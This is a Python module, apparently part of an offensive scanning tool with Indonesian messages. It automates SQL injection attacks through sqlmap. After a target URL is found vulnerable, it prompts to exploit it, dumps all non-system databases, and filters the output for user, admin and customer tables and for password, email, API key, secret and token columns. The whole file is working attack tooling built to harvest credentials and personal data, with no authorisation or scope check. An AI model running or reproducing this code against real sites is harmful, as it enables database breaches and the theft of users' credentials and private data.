# core/sqli_scan.py
import subprocess
import shutil
import os
import re
from rich.console import Console

def scan_sqli_all(endpoints):
    console = Console()
    vulns = []
    
    if not shutil.which("sqlmap"):
        console.print("[red]⚠ sqlmap tidak ditemukan — lewati SQLi scan[/red]")
        return vulns

    for url in endpoints:
        console.print(f"  Menguji: {url}", style="dim")
        try:
            result = subprocess.run(
                ["sqlmap", "-u", url, "--batch", "--risk=1", "--level=2", "--timeout=30"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=60
            )
            if "is vulnerable" in result.stdout.lower():
                vulns.append(url)
                console.print(f"\n[bold yellow][!][/bold yellow] Celah SQLi ditemukan di: {url}")
                choice = console.input("[bold yellow][?][/bold yellow] Ingin mencoba masuk ke celah? (yes/no): ").strip().lower()
                if choice == "yes":
                    exploit_sqli(url)
        except Exception as e:
            continue
    return vulns

def exploit_sqli(url):
    console = Console()
    console.print("[*] Mencoba memasuki celah...", style="bold blue")
    
    try:
        cmd = [
            "sqlmap",
            "-u", url,
            "--dump",
            "--exclude-sysdbs",
            "--answers=crack=N",
            "--batch"
        ]
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=300)
        
        if "Fetched data" in result.stdout or "Database:" in result.stdout:
            console.print("[green][✅] Berhasil masuk ke celah![/green]")
            choice = console.input("[bold yellow][?][/bold yellow] Ingin dump data penting & database? (yes/no): ").strip().lower()
            if choice == "yes":
                show_clean_dump(result.stdout)
            else:
                console.print("[cyan]Eksploitasi dihentikan.[/cyan]")
        else:
            console.print("[red][❌] Gagal memasuki celah.[/red]")
            if "WAF" in result.stderr or "WAF" in result.stdout:
                console.print("Alasan: WAF aktif — blokir permintaan")
            elif "timeout" in str(result).lower():
                console.print("Alasan: Timeout — server lambat atau diblokir")
            else:
                console.print("Alasan: Tidak ada data yang bisa diekstrak")
                
    except subprocess.TimeoutExpired:
        console.print("[red][❌] Gagal memasuki celah.[/red]")
        console.print("Alasan: Timeout — server tidak merespons")
    except Exception as e:
        console.print(f"[red][❌] Error: {e}[/red]")

def show_clean_dump(output):
    console = Console()
    console.print("\n[bold green]DATA PENTING YANG DITEMUKAN:[/bold green]")
    
    # Filter hanya data sensitif
    sensitive_tables = ["user", "admin", "wp_users", "customer", "member"]
    sensitive_cols = ["user", "pass", "email", "api", "secret", "token", "key"]
    
    lines = output.split("\n")
    in_table = False
    for line in lines:
        if any(t in line.lower() for t in sensitive_tables):
            in_table = True
            console.print(f"[yellow]{line}[/yellow]")
        elif in_table and any(c in line.lower() for c in sensitive_cols):
            console.print(f"[cyan]  → {line.strip()}[/cyan]")
        elif line.strip() == "" or line.startswith("+"):
            in_table = False
        # Abaikan HTML, script, konten artikel
    
    console.print("\n[italic]Catatan: Data HTML/konten web tidak ditampilkan.[/italic]")
